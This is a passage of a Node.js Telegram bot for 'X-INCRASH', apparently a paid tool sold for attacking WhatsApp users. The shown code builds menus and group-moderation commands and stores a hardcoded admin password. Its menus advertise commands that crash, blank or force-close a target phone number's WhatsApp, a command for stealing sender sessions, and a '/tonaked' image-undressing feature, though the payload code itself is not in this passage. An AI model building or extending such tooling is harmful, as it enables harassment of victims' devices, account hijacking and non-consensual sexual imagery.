    
    try {
        await bot.editMessageText(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ${levelText} (${percentage}%)\n` +
            ` ${bar}\n` +
            "```\n" +
            "_© ᴇɴᴄ ʙ𝚈 𝚇-𝙸𝙽𝙲𝚁𝙰𝚂𝙷 ✘_",
            {
                chat_id: chatId,
                message_id: message.message_id,
                parse_mode: "Markdown"
            }
        );
        await new Promise(resolve => setTimeout(resolve, Math.min(800, percentage * 8)));
    } catch (error) {
        console.error("Gagal memperbarui progres:", error.message);
    }
}

const GROUP_ID_FILE = './lib/group_ids.json';


function isGroupAllowed(chatId) {
  try {
    const groupIds = JSON.parse(fs.readFileSync(GROUP_ID_FILE, 'utf8'));
    return groupIds.includes(String(chatId));
  } catch (error) {
    console.error('Error membaca file daftar grup:', error);
    return false;
  }
}


function addGroupToAllowed(chatId) {
  try {
    const groupIds = JSON.parse(fs.readFileSync(GROUP_ID_FILE, 'utf8'));
    if (groupIds.includes(String(chatId))) {
      bot.sendMessage(chatId, 'Grup ini sudah diizinkan.');
      return;
    }
    groupIds.push(String(chatId));
    setAllowedGroups(groupIds);
    bot.sendMessage(chatId, 'Grup ditambahkan ke daftar yang diizinkan.');
  } catch (error) {
    console.error('Error menambahkan grup:', error);
    bot.sendMessage(chatId, 'Terjadi kesalahan saat menambahkan grup.');
  }
}

function removeGroupFromAllowed(chatId) {
  try {
    let groupIds = JSON.parse(fs.readFileSync(GROUP_ID_FILE, 'utf8'));
    groupIds = groupIds.filter(id => id !== String(chatId));
    setAllowedGroups(groupIds);
    bot.sendMessage(chatId, 'Grup dihapus dari daftar yang diizinkan.');
  } catch (error) {
    console.error('Error menghapus grup:', error);
    bot.sendMessage(chatId, 'Terjadi kesalahan saat menghapus grup.');
  }
}


function setAllowedGroups(groupIds) {
  const config = groupIds.map(String);
  fs.writeFileSync(GROUP_ID_FILE, JSON.stringify(config, null, 2));
}


function isOnlyGroupEnabled() {
  const config = JSON.parse(fs.readFileSync(ONLY_FILE));
  return config.onlyGroup || false; 
}


function setOnlyGroup(status) {
  const config = { onlyGroup: status };
  fs.writeFileSync(ONLY_FILE, JSON.stringify(config, null, 2));
}


function shouldIgnoreMessage(msg) {
  if (!msg.chat || !msg.chat.id) return false;
  if (isOnlyGroupEnabled() && msg.chat.type !== "group" && msg.chat.type !== "supergroup") {
    return msg.chat.type === "private" && !isGroupAllowed(msg.chat.id);
  } else {
    return !isGroupAllowed(msg.chat.id) && msg.chat.type !== "private";
  }
}

let groupSettings = {};
if (fs.existsSync(groupSettingsPath)) {
  groupSettings = JSON.parse(fs.readFileSync(groupSettingsPath));
}

// Simpan pengaturan grup ke file
const saveGroupSettings = () => {
  fs.writeFileSync(groupSettingsPath, JSON.stringify(groupSettings, null, 2));
};

async function loadActiveSessions() {
  try {
    const sessionsDir = path.resolve(SESSIONS_DIR);
    try {
      await fs.promises.access(sessionsDir, fs.constants.F_OK);
    } catch (error) {
      if (error.code === 'ENOENT') {
        console.log(`Direktori "${sessionsDir}" tidak ditemukan. Mengembalikan sesi kosong.`);
        return [];
      } else {
        console.error(`Error mengakses direktori sesi:`, error);
        return [];
      }
    }

    try {
      const data = await fs.promises.readFile(SESSIONS_FILE, 'utf8');
      return JSON.parse(data);
    } catch (error) {
      if (error.code === 'ENOENT') {
        console.log(`File sesi "${SESSIONS_FILE}" tidak ditemukan. Mengembalikan sesi kosong.`);
        return [];
      } else {
        console.error(`Error membaca file sesi:`, error);
        return [];
      }
    }
  } catch (error) {
    console.error("Error loading sessions:", error);
    return [];
  }
}


const bugRequests = {};
const MENU_IMAGE = "https://files.catbox.moe/3n1ksf.jpg";
const MENU_CPANEL = "https://files.catbox.moe/g45c9t.jpg";
const vidthumbnail = "https://files.catbox.moe/3n1ksf.jpg";
const ADMIN_PASSWORD = 'XINCRASH';
const loggedUsers = new Set();

// === /start ===
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  if (shouldIgnoreMessage(msg)) return; 
    
  // login check
  if (!loggedUsers.has(userId)) {
    await bot.sendMessage(chatId, "```\n🔐 Masukkan password yang diberikan oleh admin\nKetik langsung password-nya di bawah ini.\n```", { parse_mode: 'Markdown' });

    const onPassword = async (response) => {
      if (response.chat.id !== chatId || response.from.id !== userId) return;
      const input = (response.text || '').trim();

      if (input === ADMIN_PASSWORD) {
        loggedUsers.add(userId);
        await bot.sendMessage(chatId, "```\n✓ Password benar! Mengakses menu...\n```", { parse_mode: 'Markdown' });
        await showCountdown(chatId, username);
      } else {
        await bot.sendMessage(chatId, "```\nSalah Kontol, Buy Makannya.\n```", { parse_mode: 'Markdown' });
      }

      bot.removeListener('message', onPassword);
    };

    bot.on('message', onPassword);
    return;
  }

  await showCountdown(chatId, username);
});

function runtime() {
  const uptime = process.uptime();
  const hours = Math.floor(uptime / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
  const seconds = Math.floor(uptime % 60);
  return `${hours}h ${minutes}m ${seconds}s`;
}

async function showCountdown(chatId, username) {
  const delay = (ms) => new Promise(r => setTimeout(r, ms));
  const loadingMsg = await bot.sendMessage(chatId, "𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛  ");

  try {
    for (const num of ["𝗧𝗛𝗜𝗦", "𝗧𝗛𝗜𝗦 𝗜𝗦", "𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛"]) {
      await delay(500);
      await bot.editMessageText(num, {
        chat_id: chatId,
        message_id: loadingMsg.message_id
      });
    }

    await delay(500);
    await bot.editMessageText("𝗠𝗘𝗡𝗔𝗠𝗣𝗜𝗟𝗞𝗔𝗡 𝗠𝗘𝗡𝗨 𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛 ☀️🚀", {
      chat_id: chatId,
      message_id: loadingMsg.message_id
    });

  } catch (err) {
    console.error("Countdown error:", err.message);
  }

  await delay(700);
  await sendMainMenu(chatId, username);
}

function sendMainMenu(chatId, username) {
  const waktu = runtime();
  bot.sendPhoto(chatId, vidthumbnail, {
    caption: `<blockquote>【 𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛 】</blockquote>
<blockquote>こんにちは, ${username}（👋）X-INCRASHのBOTを紹介してください、スクリプトバグ WhatsApp は電話で</blockquote>
<blockquote>スクリプト作成者: @Danzriel</blockquote>
<blockquote>══════════════</blockquote>
▢ ━━⟨ INFO BOT ⟩ 𖡃
▢ Creator : @Danzriel
▢ Botname : X-INCRASH
▢ Version : 4.0.0
▢ Status : Vip Buy Only!!
▢ Uptime : ${waktu}
<blockquote>══════════════</blockquote>
<blockquote>【 𝙲𝙻𝙸𝙲𝙺 𝙱𝚄𝚃𝚃𝙾𝙽 𝙷𝙴𝚁𝙴!! 】</blockquote>
`,

    parse_mode: "HTML",
    reply_markup: {
     inline_keyboard: [
     [
      { text: "χ-ιη¢яαѕн αттα¢к", callback_data: "trashmenu" }
     ],
     [
      { text: "σωηєя мєηυ", callback_data: "accesmenu" },
      { text: "gяσυρ мєηυ", callback_data: "grupmenu" }
    ],
    [
      { text: "тσσℓѕ мєηυ", callback_data: "toolsmenu" },
      { text: "¢ραηєℓ мєηυ", callback_data: "panel" }
    ],
    [ 
      { text: "тнαηкѕ тσ", callback_data: "thanksto" },
      { text: "¢нαηηєℓ", url: "https://t.me/x_incrashPublic" }
    ]
  ]
    }
       });
}


bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const senderId = query.from.id;
    const runtime = getBotRuntime();

    let caption = "";
    let replyMarkup = {};

    if (query.data === "trashmenu") {
      caption = `<blockquote>【 𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛 】</blockquote>
▢ ━━⟨ INFO BOT ⟩ 𖡃
▢ Creator : @Danzriel
▢ Botname : X-INCRASH
▢ Version : 4.0.0
▢ Status : Vip Buy Only!!
▢ Uptime : ${runtime}
<blockquote>══════════════</blockquote>
╭▢ BUG - MENU
│/Xforclose 62×××
│/Xcrash 62×××
│/Xblank 62×××
│/Xbulldozer 62×××
│/Xdelay 62×××
│/FcXdelay 62×××
╰▢
<blockquote>══════════════</blockquote>
<code>© DanzOfficial</code>
`;
      replyMarkup = { inline_keyboard: [[{ text: "⭅ вα¢к", callback_data: "back_to_main" }]] };
    }
    
    if (query.data === "accesmenu") {
      caption = `<blockquote>【 𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛 】</blockquote>
▢ ━━⟨ INFO BOT ⟩ 𖡃
▢ Creator : @Danzriel
▢ Botname : X-INCRASH
▢ Version : 4.0.0
▢ Status : Vip Buy Only!!
▢ Uptime : ${runtime}
<blockquote>══════════════</blockquote>
╭▢ GRUOP - CONTROL
│✇ /addgroup
│✇ /delgroup
╰▢
╭▢ OWNER - MENU
│✇ /setcd (s/m/h/d)
│╰⪼ ⟨ Set Colldown Saat Mau Bug ⟩
│✇ /addprem (ID-tele)
│╰⪼ ⟨ Tambah User Premium ⟩
│✇ /listprem
│╰⪼ ⟨ Lihat Daftar Premium ⟩
│✇ /delprem (ID-tele)
│╰⪼ ⟨ Hapus User Premium ⟩
│✇ /addadmin (ID-tele)
│╰⪼ ⟨ Tambah Admin ⟩
│✇ /listadmin
│╰⪼ ⟨ Lihat Daftar Admin ⟩
│✇ /deladmin (ID-tele)
│╰⪼ ⟨ Hapus Admin ⟩
│✇ /addsender (Number)
│╰⪼ ⟨ Menghubungkan Ke WhatsApp ⟩
│✇ /listsender 
│╰⪼ ⟨ Lihat Daftar Sender ⟩
│✇ /delsender (Number)
│╰⪼ ⟨ Hapus Sender ⟩
╰▢
<blockquote>══════════════</blockquote>
<code>© DanzOfficial</code>
`;
      replyMarkup = { inline_keyboard: [[{ text: "⭅ вα¢к", callback_data: "back_to_main" }]] };
    }

    if (query.data === "toolsmenu") {
      caption = `<blockquote>【 𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛 】</blockquote>
▢ ━━⟨ INFO BOT ⟩ 𖡃
▢ Creator : @Danzriel
▢ Botname : X-INCRASH
▢ Version : 4.0.0
▢ Status : Vip Buy Only!!
▢ Uptime : ${runtime}
<blockquote>══════════════</blockquote>
╭▢ TOOLS - MENU
│✇ /csessions 
│╰⪼ ⧼ Colong Sender Via Adp ⧽ 
│✇ /getcode (https://web)
│╰⪼ ⟨ Ambil Code HTML ⟩
│✇ /iqc  (time,battery,carrier,text)
│╰⪼ ⟨ iPhone Quote Chat ⟩
│✇ /tourl (Reply foto)
│╰⪼ ⟨ Image To Url ⟩
│✇/tonaked (Reply foto)
│╰⪼ ⟨ Telanjang ⟩
│✇/encjava (Reply file .js)
│╰⪼ ⟨ iPhone Quote Chat ⟩
│✇ /tiktok (Link video tiktok)
│╰⪼ ⟨ Unduh Video Tiktok ⟩
│✇ /qc (text)
│╰⪼ ⟨ Quote Chat ⟩
╰▢
<blockquote>══════════════</blockquote>
<code>© DanzOfficial</code>
`;
      replyMarkup = { inline_keyboard: [[{ text: "⭅ вα¢к", callback_data: "back_to_main" }]] };
    }
    
    if (query.data === "grupmenu") {
      caption = `<blockquote>【 𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛 】</blockquote>
▢ ━━⟨ INFO BOT ⟩ 𖡃
▢ Creator : @Danzriel
▢ Botname : X-INCRASH
▢ Version : 4.0.0
▢ Status : Vip Buy Only!!
▢ Uptime : ${runtime}
<blockquote>══════════════</blockquote>
╭▢ GROUP - MENU
│✇ /add (@user)
│╰⪼ ⧼ Add User Ke Grup ⧽ 
│✇ /kick (@user)
│╰⪼ ⟨ Kick User Dari Grup ⟩
│✇ /mute (@user) (durasi)
│╰⪼ ⟨ bisukan pengguna ⟩
│✇ /unmute (@user)
│╰⪼ ⟨ aktifkan suara pengguna ⟩
│✇/open
│╰⪼ ⟨ Membuka Grup ⟩
│✇/close
│╰⪼ ⟨ Menutup Grup ⟩
│✇ /setwelcome (text)
│╰⪼ ⟨ atur selamat datang  ⟩
│✇ /antilink (on)
│╰⪼ ⟨ Mengaktifkan antilink ⟩
│✇ /antilink (off)
│╰⪼ ⟨ Menonaktifkan antilink ⟩
╰▢
<blockquote>══════════════</blockquote>
<code>© DanzOfficial</code>
`;
      replyMarkup = { inline_keyboard: [[{ text: "⭅ вα¢к", callback_data: "back_to_main" }]] };
    }
    
    if (query.data === "thanksto") {
      caption = `<blockquote>【 𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛 】</blockquote>

╭▢ THANKS TO
│@Danzriel ( Developer )
│Allah Swt ( My Good )
│@Otapengenkawin ( Owner Baileys )
│@ZamStecu ( Owner )
│@yimyqt ( Owner )
│@Tuanyama ( Owner )
│@RissHosting ( Friend )
│@Relstore_13 ( Ceo )
│@kikiystore ( Ceo )
│@markedip ( Patner )
│@Mstoregntg ( Patner )
│@Fizzyy11 ( Patner )
│@FANNODEV ( Patner )
╰▢
══════════════ 
<code>© DanzOfficial</code>
`;
      replyMarkup = { inline_keyboard: [[{ text: "⭅ вα¢к", callback_data: "back_to_main" }]] };
    }
    
    if (query.data === "panel") {
      caption = `<blockquote>【 𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛 】</blockquote>
▢ ━━⟨ INFO USER ⟩ 𖡃
▢ ID : ${senderId}
▢ Username : ${username}
▢ Status : ${isOwner(senderId) ? "Owner" : isAdp(senderId) ? "Patner" : isReseller(senderId) ? "Reseller" : "User"}
<blockquote>══════════════</blockquote>
╭▢ CPANEL MENU
│/1gb user,id
│/2gb user,id
│/3gb user,id
│/4gb user,id
│/5gb user,id
│/6gb user,id
│/7gb user,id
│/8gb user,id
│/9gb user,id
│/10gb user,id
│/unli user,id
│/cadp user,id
│/addres ‹ID-tele›
│/listres
│/delres ‹ID-tele›
│/addpt ‹ID-tele›
│/listpt
│/delpt ‹ID-tele›
╰▢
<blockquote>══════════════</blockquote>
<code>© DanzOfficial</code>
`;
      replyMarkup = { inline_keyboard: [[{ text: "⭅ вα¢к", callback_data: "back_to_main" }]] };
    }

    if (query.data === "back_to_main") {
      caption = `<blockquote>【 𝗫-𝗜𝗡𝗖𝗥𝗔𝗦𝗛 】</blockquote>
<blockquote>こんにちは, ${username}（👋）X-INCRASHのBOTを紹介してください、スクリプトバグ WhatsApp は電話で</blockquote>
<blockquote>スクリプト作成者: @Danzriel</blockquote>
<blockquote>══════════════</blockquote>
▢ ━━⟨ INFO BOT ⟩ 𖡃
▢ Creator : @Danzriel
▢ Botname : X-INCRASH
▢ Version : 4.0.0
▢ Status : Vip Buy Only!!
▢ Uptime : ${runtime} 
<blockquote>══════════════</blockquote>
▢ ━━⟨ INFO USER ⟩ 𖡃
▢ ID : ${senderId}
▢ Username : ${username}
▢ Status : ${isOwner(senderId) ? "Owner" : isAdmin(senderId) ? "Admin" : isPremium(senderId) ? "Premium" : "User"}
<blockquote>══════════════</blockquote>
<blockquote>【 𝙲𝙻𝙸𝙲𝙺 𝙱𝚄𝚃𝚃𝙾𝙽 𝙷𝙴𝚁𝙴!! 】</blockquote>
`;
      replyMarkup = {
     inline_keyboard: [
     [
      { text: "χ-ιη¢яαѕн αттα¢к", callback_data: "trashmenu" }
     ],
     [
      { text: "σωηєя мєηυ", callback_data: "accesmenu" },
      { text: "gяσυρ мєηυ", callback_data: "grupmenu" }
    ],
    [
      { text: "тσσℓѕ мєηυ", callback_data: "toolsmenu" },
      { text: "¢ραηєℓ мєηυ", callback_data: "panel" }
    ],
    [ 
      { text: "тнαηкѕ тσ", callback_data: "thanksto" },
      { text: "¢нαηηєℓ", url: "https://t.me/x_incrashPublic" }
    ]
  ]
      };
    }

    await bot.editMessageMedia(
      {
        type: "photo",
        media: vidthumbnail,
        caption: caption,
        parse_mode: "HTML"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});
 
bot.onText(/\/addgroup/, async (msg) => {

    if (msg.chat.type === 'private') {
        return bot.sendMessage(msg.chat.id, 'Perintah ini hanya dapat digunakan di grup.');
    }

    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const senderId = msg.from.id;
  if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId, `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
            { parse_mode: "Markdown" }
        );
    }

        addGroupToAllowed(chatId); 
    } catch (error) {
        console.error('Error adding group:', error);
        bot.sendMessage(msg.chat.id, 'Terjadi kesalahan saat menambahkan grup.');
    }
});

// Perintah /delgroup (menghapus grup tempat perintah dikeluarkan)
bot.onText(/\/delgroup/, async (msg) => {
    
    if (msg.chat.type === 'private') {
        return bot.sendMessage(msg.chat.id, 'Perintah ini hanya dapat digunakan di grup.');
    }
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const senderId = msg.from.id;
        if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId, `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
            { parse_mode: "Markdown" }
        );
    }

        removeGroupFromAllowed(chatId); 
    } catch (error) {
        console.error('Error deleting group:', error);
        bot.sendMessage(msg.chat.id, 'Terjadi kesalahan saat menghapus grup.');
    }
});

bot.onText(/\/setwelcome (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (shouldIgnoreMessage(msg)) return; 

  // ⛔ Cek apakah yang kirim adalah OWNER
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId, `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
            { parse_mode: "Markdown" }
        );
    }
  if (statusData[msg.chat.id.toString()] === 'off') return;
  if (!msg.chat.type.includes('group')) return;
  if (!isOwner(msg.from.id)) return;

  groupSettings[chatId] = groupSettings[chatId] || {};
  groupSettings[chatId].welcome = match[1];
  saveGroupSettings();

  bot.sendMessage(chatId, "✅ Pesan welcome disimpan!");
});

// === WELCOME AUTO ===
bot.on('new_chat_members', (msg) => {
  const chatId = msg.chat.id;
  const setting = groupSettings[chatId];
  if (!setting?.welcome) return;

  const name = msg.new_chat_members[0]?.first_name || 'user';
  const text = setting.welcome.replace('{name}', name);
  bot.sendMessage(chatId, text);
});

// === ANTILINK DETEKSI ===
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text || msg.caption || "";

  // ✅ Cek apakah fitur antilink aktif di grup ini
  if (!groupSettings[chatId]?.antilink) return;

  const pattern = /(?:https?:\/\/|t\.me\/|chat\.whatsapp\.com|wa\.me\/|@\w+)/i;
  if (pattern.test(text)) {
    bot.deleteMessage(chatId, msg.message_id).catch(() => {});
  }
});
// OPEN & CLOSE GB
bot.onText(/^\/(open|close)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const command = match[1].toLowerCase();
  const userId = msg.from.id;
  if (shouldIgnoreMessage(msg)) return;

  if (statusData[msg.chat.id.toString()] === 'off') return;
  
  // Cek apakah di grup
  if (msg.chat.type !== 'group' && msg.chat.type !== 'supergroup') {
    return bot.sendMessage(chatId, '❌ Perintah ini hanya bisa di grup Telegram!');
  }

  // Cek apakah pengirim admin
  try {
    const admins = await bot.getChatAdministrators(chatId);
    const isAdmin = admins.some(admin => admin.user.id === userId);
    if (!isAdmin) return bot.sendMessage(chatId, '❌ Lu bukan admin bang!');

    if (command === 'close') {
      await bot.setChatPermissions(chatId, {
        can_send_messages: false
      });
      return bot.sendMessage(chatId, '🔒 Grup telah *dikunci*! Hanya admin yang bisa kirim pesan.', { parse_mode: 'Markdown' });
    }

    if (command === 'open') {
      await bot.setChatPermissions(chatId, {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_polls: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
        can_change_info: false,
        can_invite_users: true,
        can_pin_messages: false
      });
      return bot.sendMessage(chatId, '🔓 Grup telah *dibuka*! Semua member bisa kirim pesan.', { parse_mode: 'Markdown' });
    }

  } catch (err) {
    console.error('Gagal atur izin:', err);
    return bot.sendMessage(chatId, '❌ Terjadi kesalahan saat mengatur grup.');
  }
});

const statusPath = path.join(__dirname, "bot-status.json");
if (!fs.existsSync(statusPath)) fs.writeFileSync(statusPath, JSON.stringify({}));
let statusData = JSON.parse(fs.readFileSync(statusPath));

const saveStatus = () => {
  fs.writeFileSync(statusPath, JSON.stringify(statusData, null, 2));
};

// Auto mute kalau status off
bot.on("message", (msg) => {
  const chatId = msg.chat.id.toString();
  if (statusData[chatId] === "off") return;
});

//
bot.onText(/\/antilink (on|off)/, (msg, match) => {
  const chatId = msg.chat.id;
      const senderId = msg.from.id;
      if (shouldIgnoreMessage(msg)) return; 

  // ⛔ Cek apakah yang kirim adalah OWNER
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId, `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
            { parse_mode: "Markdown" }
        );
    }
  if (statusData[msg.chat.id.toString()] === 'off') return;
  if (!msg.chat.type.includes('group')) return;
  if (!isOwner(msg.from.id)) return;

  const status = match[1].toLowerCase() === "on";
  groupSettings[chatId] = groupSettings[chatId] || {};
  groupSettings[chatId].antilink = status;
  saveGroupSettings();

  bot.sendMessage(chatId, `🔗 Antilink *${status ? 'AKTIF' : 'NONAKTIF'}*`, { parse_mode: "Markdown" });
});

// === KICK ===
// === KICK USER ===
bot.onText(/^\/kick(@\w+)?(\s.+)?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (shouldIgnoreMessage(msg)) return; 

  // Hanya bisa di grup
  if (!['group', 'supergroup'].includes(msg.chat.type)) return;
if (statusData[msg.chat.id.toString()] === 'off') return;
  try {
    const sender = await bot.getChatMember(chatId, senderId);
    if (!['administrator', 'creator'].includes(sender.status)) {
      return bot.sendMessage(chatId, '🚫 Kamu bukan admin grup ini, bro.');
    }

    let targetId, targetName;

    if (msg.reply_to_message) {
      targetId = msg.reply_to_message.from.id;
      targetName = msg.reply_to_message.from.first_name;
    } else if (match[2]) {
      const username = match[2].trim().replace('@', '');
      const members = await bot.getChatAdministrators(chatId);
      const target = members.find(m => m.user.username?.toLowerCase() === username.toLowerCase());

      if (!target) {
        return bot.sendMessage(chatId, `❌ Tidak bisa temukan user @${username} di admin list.`);
      }

      targetId = target.user.id;
      targetName = target.user.first_name;
    }

    if (!targetId) {
      return bot.sendMessage(chatId, '⚠️ Gunakan dengan reply pesan user atau mention username.\nContoh: `/kick @username` atau reply lalu `/kick`', { parse_mode: 'Markdown' });
    }

    if (targetId === bot.botInfo.id) {
      return bot.sendMessage(chatId, '🤖 Aku gak bisa kick diriku sendiri, bang.');
    }

    await bot.banChatMember(chatId, targetId);
    await bot.sendMessage(chatId, `👢 User *${targetName}* telah dikick dari grup!`, { parse_mode: 'Markdown' });

  } catch (e) {
    console.error('Kick Error:', e.message);
    return bot.sendMessage(chatId, `❌ Gagal kick user: ${e.message}`);
  }
});

// === ZETTA GUARD – FITUR ADD MEMBER + LINK SEKALI PAKAI ===
bot.onText(/\/add\s+@?(\w+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const grupname = msg.chat.username;
  const username = match[1];
  const senderId = msg.from.id;
  const nama = msg.from.username;
  if (shouldIgnoreMessage(msg)) return; 

  if (!msg.chat.type.includes('group')) return;
if (statusData[msg.chat.id.toString()] === 'off') return;
  try {
    const admin = await bot.getChatMember(chatId, senderId);
    if (!['creator', 'administrator'].includes(admin.status)) {
      return bot.sendMessage(chatId, '❌ Hanya admin yang bisa pakai perintah ini.');
    }
  } catch (e) {
    return bot.sendMessage(chatId, '⚠️ Gagal verifikasi admin.');
  }

  try {
    const invite = await bot.createChatInviteLink(chatId, {
      expire_date: Math.floor(Date.now() / 1000) + 3600, // 1 jam dari sekarang
      member_limit: 1 // hanya 1 orang bisa pakai
    });

    const text = `⧃ LINK UNDANGAN BERHASIL DIBUAT

Ⰶ Username: @${username}
Ⰶ Grup    : ${grupname}
⩥ Link    : ${invite.invite_link}
⩥ Masa    : 1 Jam
⧯ Disetujui oleh: @${nama}`;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [[
          { text: `💬 Chat @${username}`, url: `https://t.me/${username}` }
        ]]
      }
    };

    bot.sendMessage(chatId, text, opts);
  } catch (err) {
    console.error('[ADD INVITE ONCE ERROR]', err.message);
    bot.sendMessage(chatId, '⚠️ Gagal membuat link sekali pakai. Pastikan bot admin & punya izin membuat link undangan.');
  }
});

// Group 
bot.onText(/\/mute(?:\s+(\d+[a-zA-Z]+|selamanya))?/, async (msg, match) => {
  const chatId = msg.chat.id;
      const senderId = msg.from.id;
      if (shouldIgnoreMessage(msg)) return; 

  // ⛔ Cek apakah yang kirim adalah OWNER
   if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId, `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
            { parse_mode: "Markdown" }
        );
    }
  if (statusData[msg.chat.id.toString()] === 'off') return;
  if (!msg.chat.type.includes('group')) return;
  if (!isOwner(msg.from.id)) return;

  let duration = 60; // default 60 detik
  const raw = match[1];

  if (raw) {
    if (raw.toLowerCase() === 'selamanya') {
      duration = 60 * 60 * 24 * 365 * 100; // 100 tahun
    } else {
      const regex = /^(\d+)(s|m|h|d|w|mo|y)$/i;
      const parts = raw.match(regex);
      if (parts) {
        const value = parseInt(parts[1]);
        const unit = parts[2].toLowerCase();
        const unitMap = { s: 1, m: 60, h: 3600, d: 86400, w: 604800, mo: 2592000, y: 31536000 };
        duration = value * (unitMap[unit] || 60);
      }
    }
  }

  const targetId = msg.reply_to_message?.from?.id;
  if (!targetId) return bot.sendMessage(chatId, "❌ Gunakan reply ke user untuk mute.");

  try {
    const until = Math.floor(Date.now() / 1000) + duration;
    await bot.restrictChatMember(chatId, targetId, {
      can_send_messages: false,
      until_date: until,
    });
    bot.sendMessage(chatId, `🔇 User dimute selama ${raw || '60s'} (${duration} detik)`);
  } catch {
    bot.sendMessage(chatId, "❌ Gagal mute user.");
  }
});

// === UNMUTE ===
bot.onText(/\/unmute/, async (msg) => {
  const chatId = msg.chat.id;
      const senderId = msg.from.id;
      if (shouldIgnoreMessage(msg)) return; 

  // ⛔ Cek apakah yang kirim adalah OWNER
   if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId, `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
            { parse_mode: "Markdown" }
        );
    }
  if (statusData[msg.chat.id.toString()] === 'off') return;
  if (!msg.chat.type.includes('group')) return;
  if (!isOwner(msg.from.id)) return;

  const targetId = msg.reply_to_message?.from?.id;
  if (!targetId) return bot.sendMessage(chatId, "❌ Gunakan reply ke user untuk unmute.");

  try {
    await bot.restrictChatMember(chatId, targetId, {
      can_send_messages: true,
      can_send_media_messages: true,
      can_send_other_messages: true,
      can_add_web_page_previews: true,
    });
    bot.sendMessage(chatId, `🔊 User telah di-unmute.`);
  } catch {
    bot.sendMessage(chatId, "❌ Gagal unmute user.");
  }
}); 
 
bot.onText(/\/listsender/, async (msg) => {
    const chatId = msg.chat.id;
    const activeSessions = await loadActiveSessions();
    if (shouldIgnoreMessage(msg)) return; 
    
      
if (!isAdmin(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫`,
    { parse_mode: "Markdown" }
  );
}
    if (activeSessions.length === 0) {
        bot.sendMessage(chatId, 'ℹ️ Tidak ada sender yang aktif saat ini.', { parse_mode: 'Markdown' });
    } else {
        const sessionList = activeSessions.map(session => `👤${session}`).join('\n');
        const messageText = `
*Daftar Sender Aktif:*

${sessionList}
`;

        bot.sendMessage(chatId, messageText, { parse_mode: 'Markdown' });
    }
});
 
    // command qc
bot.onText(/^\/qc(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];
  if (shouldIgnoreMessage(msg)) return;

  if (!text) {
    return bot.sendMessage(chatId, "⚠️ Contoh: /qc teksnya");
  }
    
  const waktu = checkCooldown(msg.from.id);
    if (waktu > 0) return bot.sendMessage(chatId, `⏳ Tunggu ${waktu} detik sebelum bisa pakai command /qc lagi!`, { reply_to_message_id: msg.message_id });
    
  bot.sendMessage(chatId, '⏳', {
    reply_to_message_id: msg.message_id
  });

  let ppuser;
  try {
    const photos = await bot.getUserProfilePhotos(msg.from.id, { limit: 1 });
    if (photos.total_count > 0) {
      ppuser = await bot.getFileLink(photos.photos[0][0].file_id);
    } else {
      ppuser = "https://telegra.ph/file/a059a6a734ed202c879d3.jpg";
    }
  } catch (err) {
